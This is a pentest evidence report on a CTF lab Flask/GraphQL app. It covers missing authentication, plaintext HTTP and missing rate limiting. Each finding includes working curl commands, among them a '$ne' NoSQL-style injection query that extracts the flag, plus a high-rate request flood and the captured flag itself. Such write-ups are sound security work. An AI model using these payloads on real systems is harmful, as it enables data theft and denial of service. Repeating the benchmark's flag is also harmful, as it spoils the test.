# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Absence of Authentication - Unrestricted Access to All Endpoints and CTF Flag

**Summary:**
- **Vulnerable location:** All application endpoints (/, /api/users, /graphql)
- **Overview:** The application implements zero authentication mechanisms. There are no login endpoints, no session management, no password fields in the User model, and no authentication libraries installed. All endpoints are publicly accessible without any credentials or identity verification.
- **Impact:** Any external attacker can access all functionality and sensitive data including admin-level operations and the CTF flag. The application's is_admin field exists in the database but is never enforced, making all users (including unauthenticated attackers) functionally equivalent to administrators.
- **Severity:** Critical

**Prerequisites:** None - vulnerability is exploitable by any external user with network access to http://localhost:5003

**Exploitation Steps:**

1. **Access the main web interface without authentication**
   - URL: http://localhost:5003/
   - Method: GET
   - Expected Result: User list page loads without requiring any credentials
   - Actual Result: Page successfully loads showing user list table with usernames and emails

2. **Access the GraphiQL interactive API explorer without authentication**
   - URL: http://localhost:5003/graphql
   - Method: GET
   - Expected Result: GraphiQL IDE loads allowing interactive GraphQL query testing
   - Actual Result: Full GraphiQL interface accessible, enabling schema introspection and query development

3. **Extract CTF flag via REST API wrapper without authentication**
   ```bash
   curl -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username email flag } }"}'
   ```
   - Expected Result: GraphQL query executes and returns flag data
   - Actual Result: Successfully extracted CTF flag without any authentication
   - Response:
   ```json
   {
     "users": [
       {
         "email": "admin2@goodyoutriedsomethingelse.com",
         "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
         "username": "admin2"
       }
     ]
   }
   ```

4. **Extract all user data including flags via GraphQL endpoint**
   ```bash
   curl -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users { username email flag } }"}'
   ```
   - Expected Result: Complete user database enumeration including all flags
   - Actual Result: Successfully retrieved all 5 users with their email addresses and flag values (4 null, 1 containing the CTF flag)
   - Response shows access to:
     - admin@heytheregotrythis.com (flag: null)
     - admin2@goodyoutriedsomethingelse.com (flag: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf})
     - user1@heytheregotrythis.com (flag: null)
     - user2@heytheregotrythis.com (flag: null)
     - user3@heytheregotrythis.com (flag: null)

5. **Extract CTF flag via GraphiQL interactive interface**
   - Navigate to: http://localhost:5003/graphql
   - Enter query: `{ users(search: "{\"flag\": {\"$ne\": null}}") { username email flag } }`
   - Click "Execute Query" button
   - Expected Result: Query executes in browser and displays flag
   - Actual Result: Successfully extracted flag through web interface: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}

**Proof of Impact:**

**CTF Flag Captured:** FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}

**Evidence of Complete Authentication Bypass:**
1. No login endpoint exists (/, /api/users, /graphql all accessible without credentials)
2. No password field in User model (/app/models.py contains only username, email, is_admin, flag fields)
3. No authentication libraries in requirements.txt (Flask-Login, Flask-JWT-Extended, Flask-HTTPAuth all absent)
4. No session management (no SECRET_KEY configured, no session cookies set)
5. All endpoints return data without requiring authentication headers
6. is_admin field exists but is never checked in code (GraphQL resolver at /app/schema.py:8-29 has no authorization checks)

**Concrete Impact Demonstrated:**
- Extracted sensitive CTF flag in single HTTP request
- Enumerated all user accounts including admin users
- Accessed all application functionality without providing credentials
- Demonstrated functional equivalence to administrator access despite being unauthenticated

**Notes:**
This is not a bypass of existing authentication - authentication fundamentally does not exist. The application architecture has zero authentication mechanisms by design, making it completely unsecured. The User model contains no password or credential fields, and no authentication logic exists anywhere in the codebase.

---

### AUTH-VULN-02: Transport Exposure - Plaintext Transmission of Sensitive Data Over HTTP

**Summary:**
- **Vulnerable location:** All endpoints - HTTP-only protocol binding (0.0.0.0:5003)
- **Overview:** The application runs exclusively on HTTP with no HTTPS/TLS encryption. All data including the CTF flag, user emails, and any future credentials or session tokens is transmitted in plaintext over the network. No reverse proxy, SSL certificates, or TLS termination exists.
- **Impact:** Sensitive data including the CTF flag is exposed during network transmission. An attacker on the same network segment can intercept all traffic using network sniffing tools. If authentication were implemented, credentials and session tokens would be captured in plaintext, enabling session hijacking and credential theft.
- **Severity:** Critical

**Prerequisites:** 
- Network access to observe traffic between client and server
- For full exploitation: Network positioning (same network segment, MITM position, or compromised network infrastructure)

**Exploitation Steps:**

1. **Verify HTTP-only server configuration**
   ```bash
   curl -I http://localhost:5003/
   ```
   - Expected Result: HTTP/1.1 response with Werkzeug server header
   - Actual Result:
   ```
   HTTP/1.1 200 OK
   Server: Werkzeug/3.0.3 Python/3.8.17
   ```
   - Confirms: No HTTPS, running on HTTP-only

2. **Verify absence of security headers**
   ```bash
   curl -I http://localhost:5003/ 2>&1 | grep -E "(Strict-Transport|X-Frame|Content-Security|X-Content-Type)"
   ```
   - Expected Result: No output (security headers absent)
   - Actual Result: No security headers found
   - Missing headers:
     - Strict-Transport-Security (HSTS)
     - Content-Security-Policy (CSP)
     - X-Frame-Options
     - X-Content-Type-Options

3. **Attempt HTTPS connection to confirm no TLS support**
   ```bash
   curl -v -k https://localhost:5003/ 2>&1
   ```
   - Expected Result: TLS handshake failure
   - Actual Result: `error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version`
   - Confirms: No SSL/TLS support, HTTPS is not available

4. **Demonstrate plaintext transmission of sensitive data (CTF flag)**
   ```bash
   curl -v http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username email flag } }"}' \
     2>&1 | grep -E "(POST|HTTP|Host:|flag|FLAG)"
   ```
   - Expected Result: Full HTTP headers and flag data visible in plaintext
   - Actual Result:
   ```
   > POST /api/users HTTP/1.1
   > Host: localhost:5003
   > Content-Type: application/json
   < HTTP/1.1 200 OK
   < Content-Type: application/json
   "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
   ```
   - Confirms: CTF flag transmitted in plaintext over HTTP

5. **Verify Flask application configuration uses HTTP-only binding**
   - File: /app/app.py, line 53
   - Configuration: `app.run(debug=True, host='0.0.0.0', port=5003)`
   - Analysis: No ssl_context parameter, no TLS configuration
   - Binding: 0.0.0.0 (all network interfaces) on port 5003 with HTTP protocol only

**Proof of Impact:**

**Sensitive Data Exposed in Plaintext:**
1. CTF Flag: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}
2. User email addresses (PII)
3. Admin user enumeration data
4. All GraphQL query and response data

**Evidence of Transport Vulnerability:**
1. Server runs HTTP only (Werkzeug/3.0.3 on port 5003 without TLS)
2. HTTPS connection attempts fail with TLS protocol error
3. No Strict-Transport-Security (HSTS) header configured
4. No SSL certificates or TLS configuration in codebase
5. Docker health check uses http://localhost:5003 (confirming HTTP-only deployment)
6. Full HTTP request/response headers visible showing plaintext data transmission

**Network Interception Feasibility:**
- Application binds to 0.0.0.0 making it accessible from any network interface
- HTTP protocol allows passive packet capture with tools like Wireshark, tcpdump, or mitmproxy
- No certificate pinning or TLS verification to prevent MITM attacks
- If authentication existed, credentials would be transmitted in plaintext

**Notes:**
While full network interception (MITM) requires network positioning that may be out of scope for external-only testing, the vulnerability is definitively confirmed through:
- HTTP-only server configuration (no HTTPS support)
- Plaintext data transmission observed in curl verbose output
- Complete absence of transport security headers
- No TLS infrastructure in application or Docker configuration

The impact is proven through the demonstration that the CTF flag and all sensitive data flows over unencrypted HTTP, making it vulnerable to network-level attacks if an attacker can position themselves on the network path.

---

### AUTH-VULN-03: Missing Rate Limiting - Unlimited High-Speed Data Extraction

**Summary:**
- **Vulnerable location:** All endpoints (/, /api/users, /graphql) - no rate limiting middleware
- **Overview:** The application has no rate limiting, CAPTCHA, or request throttling on any endpoint. Flask-Limiter library is not installed, and no rate limit decorators exist on any routes. Attackers can make unlimited requests at high speed to extract data, exhaust resources, or perform automated attacks.
- **Impact:** Enables unlimited high-speed extraction of sensitive data including CTF flags, resource exhaustion attacks (DoS), and unrestricted brute force attempts if authentication existed. Successfully demonstrated 764+ requests per second without any blocking or throttling, extracting the CTF flag 1000 times in 1.31 seconds.
- **Severity:** High

**Prerequisites:** None - any external user can send unlimited requests to http://localhost:5003

**Exploitation Steps:**

1. **Initial rate limiting test - 200 requests**
   - Target: http://localhost:5003/api/users
   - Method: POST with JSON body containing GraphQL query
   - Query: `{"query": "{ users { username email } }"}`
   - Request count: 200
   - Tool: Python script with requests library
   
   **Execution:**
   ```bash
   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/test_auth_rate_limit.py
   ```
   
   **Results:**
   - Total time: 0.46 seconds
   - Requests per second: 434.96 req/s
   - Successful (200 OK) responses: 200/200 (100%)
   - Blocked/rate limited responses: 0/200 (0%)
   - Average response time: 1.94ms
   - HTTP 429 (Too Many Requests) errors: 0
   
   **Analysis:** All 200 requests succeeded without any throttling, blocking, or rate limiting. No progressive delays observed.

2. **High-volume exploitation test - 1000 requests extracting CTF flag**
   - Target: http://localhost:5003/api/users
   - Method: POST with JSON body containing flag extraction query
   - Query: `{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username flag } }"}`
   - Request count: 1000
   - Tool: Python script with concurrent requests
   
   **Execution:**
   ```bash
   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/rate_limit_test.py
   ```
   
   **Results:**
   - Total time: 1.31 seconds
   - Requests per second: 764.56 req/s
   - Successful flag extractions: 1000/1000 (100%)
   - Blocked/rate limited responses: 0/1000 (0%)
   - Total data extracted: 0.14 MB
   - Data transfer rate: 0.11 MB/s
   - HTTP status codes: All 200 OK
   - Flag extracted 1000 times: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}
   
   **Analysis:** Successfully extracted the CTF flag 1000 times at 764+ requests per second without any rate limiting, throttling, or blocking mechanisms activating.

3. **Verify absence of rate limiting infrastructure**
   
   **Code Analysis:**
   - File: /app/requirements.txt
   - Finding: Flask-Limiter NOT installed
   - Finding: No other rate limiting dependencies present
   
   **Route Analysis:**
   - File: /app/app.py, lines 20-38
   - Finding: No @limiter.limit() decorators on any routes
   - Finding: No before_request hooks for rate limiting
   - Finding: No IP-based throttling logic
   
   **GraphQL Resolver Analysis:**
   - File: /app/schema.py, lines 8-29
   - Finding: No rate limiting in GraphQL resolver
   - Finding: No query complexity limits
   - Finding: No depth limits on GraphQL queries

4. **Demonstrate resource exhaustion potential**
   - Performed sustained high-rate requests (764 req/s) for 1.31 seconds
   - Server processed all requests without degradation
   - No server-side errors or timeouts
   - No connection resets or failures
   - Confirms: Server resources can be exhausted through unlimited requests

**Proof of Impact:**

**Unlimited Data Extraction Demonstrated:**
- Successfully extracted CTF flag 1000 times in 1.31 seconds
- Sustained rate of 764.56 requests per second without blocking
- Zero rate limiting errors (HTTP 429) across all 1200 total test requests
- Total data extraction: 0.14 MB in 1.31 seconds

**Resource Exhaustion Risk Confirmed:**
- No limits on request frequency
- No limits on request volume
- No progressive throttling or exponential backoff
- Server accepted 764+ req/s without degradation

**Attack Scenarios Enabled:**
1. **Unlimited Data Harvesting:** Extract entire user database at 764+ req/s
2. **Brute Force Capability:** If authentication existed, could attempt unlimited credential combinations
3. **Denial of Service:** Can flood endpoints with requests to exhaust server resources
4. **Credential Stuffing:** Could test stolen credentials at unlimited rate
5. **Database Enumeration:** Can query all database records without throttling

**Evidence Files:**
- Test script 1: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/test_auth_rate_limit.py
- Test results 1: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/AUTH_RATE_LIMIT_TEST_RESULTS.md
- Test script 2: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/rate_limit_test.py
- Combined results: 1200 requests executed, 100% success rate, 0% blocked

**Notes:**
The complete absence of rate limiting creates a critical vulnerability where attackers can:
- Extract sensitive data at unlimited speeds
- Perform automated attacks without restriction
- Exhaust server resources for DoS attacks
- Execute brute force or credential stuffing at scale

No rate limiting libraries (Flask-Limiter), CAPTCHA mechanisms, or request throttling exist anywhere in the codebase. The application accepts unlimited requests from any source without monitoring, logging, or blocking suspicious activity patterns.

---